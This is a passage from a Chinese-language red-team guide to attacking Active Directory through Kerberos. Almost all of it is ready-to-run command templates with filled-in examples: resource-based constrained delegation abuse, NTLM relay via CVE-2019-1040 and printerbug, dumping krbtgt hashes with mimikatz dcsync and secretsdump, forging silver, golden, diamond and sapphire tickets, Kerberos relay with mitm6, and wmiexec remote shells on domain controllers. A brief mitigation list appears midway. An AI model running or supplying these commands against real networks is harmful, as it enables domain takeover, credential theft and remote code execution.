proxychains python3 addcomputer.py <域名>/<具备创建机器账号的域用户>:<密码> -method SAMR -computer-name <要创建的机器账号名称> -computer-pass <要创建的机器账号的密码> -dc-ip <主域控服务器IP>
# 示例
proxychains python3 addcomputer.py redteam.com/addpcadmin:addpcadmin@123 -method SAMR -computer-name HACK\$ -computer-pass P@ssw0rd -dc-ip 10.10.10.1
```

![rbcd](../../images/AD/Kerberos/rbcd-att-1.png)

- 修改目标机器的服务资源委派属性

  - 使用rbcd修改

  ```shell
  # 模板
  proxychains python3 rbcd.py <域名>/<具备创建机器账号的域用户>:<密码> -delegate-from '<刚才创建的机器账号>' -delegate-to '<要提权的机器账号>' -dc-ip <主域控服务器IP> -action write
  # 示例
  proxychains python3 rbcd.py redteam.com/addpcadmin:addpcadmin@123 -delegate-from 'HACK$' -delegate-to 'MSSQLSERVER$' -dc-ip 10.10.10.1 -action write
  ```
  
  ![rbcd](../../images/AD/Kerberos/rbcd-att-2.png)
  
  - 使用PowerView修改
  
    - 查询刚才创建机器账号的SID
  
      - 使用PowerView查找
  
      ```shell
      # 模板
      powershell-import PowerView.ps1
      powerpick Get-NetComputer <刚才创建的机器账号> -Properties objectsid
      # 示例
      powershell-import PowerView.ps1
      powerpick Get-NetComputer HACK -Properties objectsid
      ```
  
      ![rbcd](../../images/AD/Kerberos/rbcd-att-3.png)
  
      - 使用ldapdomaindump查找
  
      ```shell
      # 模板
      proxychains python3 ldapdomaindump -u <域名>\\<账号> -p <密码> <域控服务器IP>
      grep <刚才创建的机器账号> domain_computers.grep
      # 示例
      proxychains ldapdomaindump -u redteam.com\\worker -p worker@123 10.10.10.1
      grep HACK domain_computers.grep
      ```
  
      ![rbcd](../../images/AD/Kerberos/rbcd-att-4.png)
  
      - 修改msDS-AllowedToActOnBehalfOfOtherIdentity的值
  
      ```shell
      # 模板
      powershell-import PowerView.ps1
      powerpick $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList 'O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<刚才创建机器账号的SID>)';$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer <要提权的机器账号> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
      powerpick Get-DomainComputer <要提权的机器账号> -Properties msds-allowedtoactonbehalfofotheridentity
      # 示例
      powershell-import PowerView.ps1
      powerpick $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList 'O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2481340254-715925007-1998582121-1112)';$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer MSSQLSERVER | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
      powerpick Get-DomainComputer MSSQLSERVER -Properties msds-allowedtoactonbehalfofotheridentity
      ```
  
      ![rbcd](../../images/AD/Kerberos/rbcd-att-5.png)

- 查看属性是否修改成功

  - 使用rbcd查看

  ```shell
  # 模板
  proxychains python3 rbcd.py <域名>/<具备创建机器账号的域用户>:<密码> -delegate-to '<要提权的机器账号>' -dc-ip <域控服务器IP> -action read
  # 示例
  proxychains python3 rbcd.py redteam.com/addpcadmin:addpcadmin@123 -delegate-to 'MSSQLSERVER$' -dc-ip 10.10.10.1 -action read
  ```

  ![rbcd](../../images/AD/Kerberos/rbcd-att-6.png)

  - 使用PowerView查看

  ```shell
  # 模板
  powershell-import PowerView.ps1
  powershell Get-DomainComputer <要提权的机器账号> -Properties msds-allowedtoactonbehalfofotheridentity
  # 示例
  powershell-import PowerView.ps1
  powershell Get-DomainComputer MSSQLSERVER -Properties msds-allowedtoactonbehalfofotheridentity
  ```

  ![rbcd](../../images/AD/Kerberos/rbcd-att-7.png)

- 使用getST申请ST票据

```shell
# 模板
proxychains python3 getST.py <域名>/<刚才创建的机器账号>:<密码> -spn <目标服务器的SPN服务> -impersonate administrator -dc-ip <域控服务器IP> -force-forwardable
# 示例
proxychains python3 getST.py redteam.com/HACK$:P@ssw0rd -spn cifs/MSSQLSERVER.redteam.com -impersonate administrator -dc-ip 10.10.10.1 -force-forwardable
```

![rbcd](../../images/AD/Kerberos/rbcd-att-8.png)

- 使用exec工具远控目标服务器

```shell
# 模板
KRB5CCNAME=<票据名称> proxychains python3 wmiexec.py -k <域名>/administrator@<目标机器域名> -no-pass
# 示例
KRB5CCNAME=administrator.ccache proxychains python3 wmiexec.py -k redteam.com/administrator@MSSQLSERVER.redteam.com -no-pass
```

![rbcd](../../images/AD/Kerberos/rbcd-att-9.png)

###### 通过Account Operators组用户拿下主机

> 利用条件

- 目标用户属于Account Operators用户组

> 攻击方法
>

- 查找属于Account Operators用户组的账号

  - 使用AdFind查找

  ```shell
  # 模板
  AdFind.exe -h <域控服务器IP>:389 -s subtree -b CN="Account Operators",CN=Builtin,DC=<域名>,DC=<域名> member
  # 示例
  AdFind.exe -h 10.10.10.1:389 -s subtree -b CN="Account Operators",CN=Builtin,DC=redteam,DC=com member
  ```

  ![rbcd](../../images/AD/Kerberos/rbcd-att-10.png)

  - 使用ldapdomaindump查找

  ```shell
  # 模板
  proxychains python3 ldapdomaindump -u <域名>\\<账号> -p <密码> <域控服务器IP>
  grep "Account Operators" domain_users.grep
  # 示例
  proxychains ldapdomaindump -u redteam.com\\worker -p worker@123 10.10.10.1
  grep "Account Operators" domain_users.grep
  ```

  ![rbcd](../../images/AD/Kerberos/rbcd-att-11.png)

- 使用addcomputer创建机器账号

```shell
# 模板
proxychains python3 addcomputer.py <域名>/<具备创建机器账号的域用户>:<密码> -method SAMR -computer-name <要创建的机器账号名称> -computer-pass <要创建的机器账号的密码> -dc-ip <主域控服务器IP>
# 示例
proxychains python3 addcomputer.py redteam.com/allpcadmin:allpcadmin@123 -method SAMR -computer-name BACKDOOR\$ -computer-pass P@ssw0rd -dc-ip 10.10.10.1
```

![rbcd](../../images/AD/Kerberos/rbcd-att-12.png)

- 修改目标机器的服务资源委派属性

```shell
# 模板
proxychains python3 rbcd.py <域名>/<具备创建机器账号的域用户>:<密码> -delegate-from '<刚才创建的机器账号>' -delegate-to '<要提权的机器账号>' -dc-ip <域控服务器IP> -action write
# 示例
proxychains python3 rbcd.py redteam.com/allpcadmin:allpcadmin@123 -delegate-from 'BACKDOOR$' -delegate-to 'HTTPSERVER$' -dc-ip 10.10.10.1 -action write
```

![rbcd](../../images/AD/Kerberos/rbcd-att-13.png)

- 使用getST申请ST票据

```shell
# 模板
proxychains python3 getST.py <域名>/<刚才创建的机器账号>:<密码> -spn <目标服务器的SPN服务> -impersonate administrator -dc-ip <域控服务器IP> -force-forwardable
# 示例
proxychains python3 getST.py redteam.com/BACKDOOR$:P@ssw0rd -spn cifs/HTTPSERVER.redteam.com -impersonate administrator -dc-ip 10.10.10.1 -force-forwardable
```

![rbcd](../../images/AD/Kerberos/rbcd-att-14.png)

- 远程连接目标服务器

```shell
# 模板
KRB5CCNAME=<票据名称> proxychains python3 wmiexec.py -k <域名>/administrator@<目标机器域名> -no-pass
# 示例
KRB5CCNAME=administrator.ccache proxychains python3 wmiexec.py -k redteam.com/administrator@HTTPSERVER.redteam.com -no-pass
```

![rbcd](../../images/AD/Kerberos/rbcd-att-15.png)

###### 通过 NTLM Relay 和 CVE-2019-1040 拿下主机

> 利用条件

- 具备管理员权限完成SMB端口转发

> 攻击方法

- 使用addcomputer创建机器账号

```shell
# 模板
proxychains python3 addcomputer.py <域名>/<具备创建机器账号的域用户>:<密码> -method SAMR -computer-name <要创建的机器账号名称> -computer-pass <要创建的机器账号的密码> -dc-ip <域控服务器IP>
# 示例
proxychains python3 addcomputer.py redteam.com/addpcadmin:addpcadmin@123 -method SAMR -computer-name ROOTKIT\$ -computer-pass P@ssw0rd -dc-ip 10.10.10.1
```

![rbcd](../../images/AD/Kerberos/rbcd-att-16.png)

- 开启ntlmrelayx并利用CVE-2019-1040漏洞

```shell
# 模板
proxychains python3 ntlmrelayx.py -t ldap://<域控服务器IP> -smb2support --remove-mic --delegate-access --escalate-user <刚才创建的机器账号>
# 示例
proxychains python3 ntlmrelayx.py -t ldap://10.10.10.1 -smb2support --remove-mic --delegate-access --escalate-user ROOTKIT\$
```

![rbcd](../../images/AD/Kerberos/rbcd-att-17.png)

- 使用printerbug触发强制认证漏洞

```shell
# 模板
proxychains python3 printerbug.py <域名>/<域用户名>:<密码>@<要提权的服务器IP> <中继IP>
# 示例
proxychains python3 printerbug.py redteam.com/addpcadmin:addpcadmin@123@10.10.80.2 10.10.255.1
```

![rbcd](../../images/AD/Kerberos/rbcd-att-18.png)

- 成功获取目标服务器的约束委派权限

![rbcd](../../images/AD/Kerberos/rbcd-att-19.png)

- 使用getST申请ST票据

```shell
# 模板
proxychains python3 getST.py <域名>/<刚才创建的机器账号>:<密码> -spn <目标服务器的SPN服务> -impersonate administrator -dc-ip <域控服务器IP> -force-forwardable
# 示例
proxychains python3 getST.py redteam.com/ROOTKIT$:P@ssw0rd -spn cifs/HTTPSERVER.redteam.com -impersonate administrator -dc-ip 10.10.10.1 -force-forwardable
```

![rbcd](../../images/AD/Kerberos/rbcd-att-20.png)

- 远程连接受控服务器

```shell
# 模板
KRB5CCNAME=<票据名称> proxychains python3 wmiexec.py -k <域名>/administrator@<目标机器域名> -no-pass
# 示例
KRB5CCNAME=administrator.ccache proxychains python3 wmiexec.py -k redteam.com/administrator@HTTPSERVER.redteam.com -no-pass
```

![rbcd](../../images/AD/Kerberos/rbcd-att-21.png)

#### 防护措施

- 对于高权限用户，设置为敏感用户，不能被委派
- 若要设置委派，不设置非约束性委派而是设置约束性委派
- 可以将敏感用户添加至Protected User组中，该组用户不允许被委派
- 使用KB4598347补丁

## 域用户权限维持

### Silver Ticket - 白银票据（TGS）

#### 前期准备

- 使用mimikatz获取SPN机器账号的hash

```shell
logonpasswords
```

![silver](../../images/AD/Kerberos/silver-cnd-1.png)

#### 攻击方式

##### 使用ticketer制作白银票据

> 制作方法

```shell
# 模板
proxychains python3 ticketer.py -spn <目标SPN服务> -domain-sid <域SID> -domain <域名> -nthash <SPN机器账号的NTLM HASH> <要伪造的用户> # 伪造的用户一般是administrator
# 示例
proxychains python3 ticketer.py -spn cifs/HTTPSERVER.redteam.com -domain-sid S-1-5-21-2481340254-715925007-1998582121 -domain redteam.com -nthash 2ab4a4ebad3f05cf35ca6b97c68dc238 administrator
```

![silver](../../images/AD/Kerberos/silver-att-1.png)

>  使用方法

- 使用secretsdump导出SPN服务器的管理员HASH

```shell
# 模板
KRB5CCNAME=<票据名称> proxychains python3 secretsdump.py -k -no-pass administrator@<目标SPN服务器> -dc-ip <域控服务器IP> -use-vss
# 示例
KRB5CCNAME=administrator.ccache proxychains python3 secretsdump.py -k -no-pass administrator@HTTPSERVER.redteam.com -dc-ip 10.10.10.1 -use-vss
```

![silver](../../images/AD/Kerberos/silver-att-2.png)

- 使用exec工具远控SPN服务器

```shell
# 模板
proxychains python3 wmiexec.py -hashes <NTLM HASH> <SPN服务器名称>/<本地管理员用户名>@<SPN服务器域名> -no-pass
# 示例
proxychains python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e46b6afab73b88454baf2d3dd25c47f8 HTTPSERVER/administrator@HTTPSERVER.redteam.com -no-pass
```

![silver](../../images/AD/Kerberos/silver-att-3.png)

### Gloden Ticket - 黄金票据（TGT）

#### 前期准备

- 使用mimikatz获取krbtgt用户的hash和域sid

```shell
# 模板
mimikatz lsadump::dcsync /domain:<域名> /user:krbtgt
# 示例
mimikatz lsadump::dcsync /domain:redteam.com /user:krbtgt
```

![golden](../../images/AD/Kerberos/golden-cnd-1.png)

#### 攻击方式

##### 使用ticketer制作黄金票据

> 制作方法

```shell
# 模板
proxychains python3 ticketer.py -domain-sid <krbtgt所在域的SID> -nthash <ntlm hash> -domain <域名> administrator
# 示例
proxychains python3 ticketer.py -domain-sid S-1-5-21-2481340254-715925007-1998582121 -nthash 076dd08ab93bb81282ae6f39260d2962 -domain redteam.com administrator
```

![golden](../../images/AD/Kerberos/golden-att-1.png)

> 使用方法

```shell
# 模板
KRB5CCNAME=<票据名称> proxychains python3 wmiexec.py -k <域名>/administrator@<目标机器域名> -no-pass
# 示例
KRB5CCNAME=administrator.ccache proxychains python3 wmiexec.py -k redteam.com/administrator@DC.redteam.com -no-pass
```

![golden](../../images/AD/Kerberos/golden-att-2.png)

##### 使用mimikatz制作黄金票据

> 制作方法

```shell
# 模板
mimikatz kerberos::golden /user:administrator /domain:<域名> /sid:<krbtgt用户的SID> /krbtgt:<krbtgt用户的hash> /ticket:administrator.kribi
# 示例
mimikatz kerberos::golden /user:administrator /domain:redteam.com /sid:S-1-5-21-2031906553-2665046962-2085994062 /krbtgt:17d72baf674fc3571fb362cc7fe03287 /ticket:administrator.kribi
```

![golden](../../images/AD/Kerberos/golden-att-3.png)

> 使用方法

```shell
# 模板
mimikatz kerberos::ptt <票据文件路径>
# 示例
mimikatz kerberos::ptt administrator.kribi
```

![golden](../../images/AD/Kerberos/golden-att-4.png)

##### 使用Cobalt  Strike制作黄金票据

> 制作方法

![golden](../../images/AD/Kerberos/golden-att-5.png)

#### RBCD实现变种黄金票据

- 使用addcomputer创建机器账号

```shell
# 模板
proxychains python3 addcomputer.py <域名>/<具备创建机器账号的域用户>:<密码> -method SAMR -computer-name <要创建的机器账号名称> -computer-pass <要创建的机器账号的密码> -dc-ip <主域控服务器IP>
# 示例
proxychains python3 addcomputer.py redteam.com/addpcadmin:addpcadmin@123 -method SAMR -computer-name GLODEN\$ -computer-pass P@ssw0rd -dc-ip 10.10.10.1
```

![golden](../../images/AD/Kerberos/golden-att-rbcd-1.png)

- 设置krbtgt委派

```shell
# 模板
powerpick Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount <刚才创建的机器账号>
powerpick Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount
# 示例
powerpick Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount GLODEN$
powerpick Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount
```

![golden](../../images/AD/Kerberos/golden-att-rbcd-2.png)

- 使用getST申请ST票据

```shell
# 模板
proxychains python3 getST.py <域名>/<刚才创建的机器账号>:<密码> -spn <目标服务器的SPN服务> -impersonate administrator -dc-ip <域控服务器IP> -force-forwardable
# 示例
proxychains python3 getST.py redteam.com/GLODEN$:P@ssw0rd -spn krbtgt -impersonate administrator -dc-ip 10.10.10.1 -force-forwardable
```

![golden](../../images/AD/Kerberos/golden-att-rbcd-3.png)

- 远程连接受控服务器

```shell
# 模板
KRB5CCNAME=<票据名称> proxychains python3 wmiexec.py -k <域名>/administrator@<目标机器域名> -no-pass
# 示例
KRB5CCNAME=administrator.ccache proxychains python3 wmiexec.py -k redteam.com/administrator@DC.redteam.com -no-pass
```

![golden](../../images/AD/Kerberos/golden-att-rbcd-4.png)

### Diamond Ticket - 钻石票据

#### 前期准备

- 使用mimikatz获取krbtgt用户的aeskey和域SID

```shell
# 模板
mimikatz lsadump::dcsync /domain:<域名> /user:krbtgt
# 示例
mimikatz lsadump::dcsync /domain:redteam.com /user:krbtgt
```

![diamond](../../images/AD/Kerberos/diamond-info-1.png)

#### 攻击方法

> 制作方法

- 这里使用-request发起真实的TGT票据请求

```shell
# 模板
proxychains python3 ticketer.py -request -domain <域名> -domain-sid <域SID> -user <普通域账号> -password <密码> -aesKey <krbtgt的aeskey> <要伪造的用户>
# 示例
proxychains python3 ticketer.py -request -domain redteam.com -domain-sid S-1-5-21-2481340254-715925007-1998582121 -user worker -password worker@123 -aesKey 38d073d85d02ff8d3454d06e963e6bbed772633bdbc0a8d5b087403d7c863315 administrator
```

![diamond](../../images/AD/Kerberos/diamond-att-1.png)

> 使用方法

```shell
# 模板
KRB5CCNAME=<票据名称> proxychains python3 wmiexec.py -k <域名>/administrator@<目标机器域名> -no-pass
# 示例
KRB5CCNAME=administrator.ccache proxychains python3 wmiexec.py -k redteam.com/administrator@DC.redteam.com -no-pass
```

![diamond](../../images/AD/Kerberos/diamond-att-2.png)

### Sapphire Ticket - 蓝宝石票据

#### 前期准备

- 使用mimikatz获取krbtgt用户的aeskey和域SID

```shell
# 模板
mimikatz lsadump::dcsync /domain:<域名> /user:krbtgt
# 示例
mimikatz lsadump::dcsync /domain:redteam.com /user:krbtgt
```

![sapphire](../../images/AD/Kerberos/sapphire-info-1.png)

#### 攻击方法

> 制作方法

- 这里使用-impersonate模拟域管理员伪造TGT票据

```shell
# 模板
proxychains python3 ticketer.py -request -impersonate <域管理员> -domain <域名> -user <域账号> -password <密码> -nthash <krbtgt的NT HASH> -aesKey <krbtgt的aeskey> -domain-sid <域SID>
# 示例
proxychains python3 ticketer.py -impersonate administrator -request -domain redteam.com -domain-sid S-1-5-21-2481340254-715925007-1998582121 -user worker -password worker@123 -nthash 076dd08ab93bb81282ae6f39260d2962 -aesKey 38d073d85d02ff8d3454d06e963e6bbed772633bdbc0a8d5b087403d7c863315 administrator
```

![sapphire](../../images/AD/Kerberos/sapphire-att-1.png)

> 使用方法

```shell
# 模板
KRB5CCNAME=<票据名称> proxychains python3 wmiexec.py -k <域名>/administrator@<目标机器域名> -no-pass
# 示例
KRB5CCNAME=administrator.ccache proxychains python3 wmiexec.py -k redteam.com/administrator@DC.redteam.com -no-pass
```

![sapphire](../../images/AD/Kerberos/sapphire-att-2.png)

## Kerberos Relay //TODO

![](../../images/Kerberos-Relay.jpg)

### 攻击方式

#### MITM6

- 使用certutil命令获取域内ADCS服务器信息

```shell
certutil -dump
```

- 攻击机开启krbrelayx监听，获取目标服务器机器账户权限

```shell
# 模板
proxychains python3 krbrelayx.py --target http://<ADCS服务器域名>/certsrv/ -ip <攻击机IP> --victim <受害服务器域名> --adcs --template Machine
# 示例
proxychains python3 krbrelayx.py --target http://CA.redteam.com/certsrv/ -ip 10.10.255.1 --victim DC.redteam.com --adcs --template Machine
```

- 攻击机开启mitm6监听

```shell
# 模板
mitm6.exe --domain redteam.com --host-allowlist DC.redteam.com --relay 10.10.10.1
# 示例
mitm6.exe --domain <域名> --host-allowlist <受害服务器域名> --relay <ADCS服务器域名>
```

- 等待目标机器进行IPv6记录更新查询，触发查询即可获取base64证书数据
- 获取base64证书数据后，使用wmiexec远程执行命令

```shell
# 模板
KRB5CCNAME=<票据名称> proxychains python3 wmiexec.py -k <域名>/administrator@<目标机器域名> -no-pass
# 示例
KRB5CCNAME=administrator.ccache proxychains python3 wmiexec.py -k redteam.com/administrator@DC.redteam.com -no-pass
```

#### CVE-2022-33647 - 强制认证漏洞 //TODO
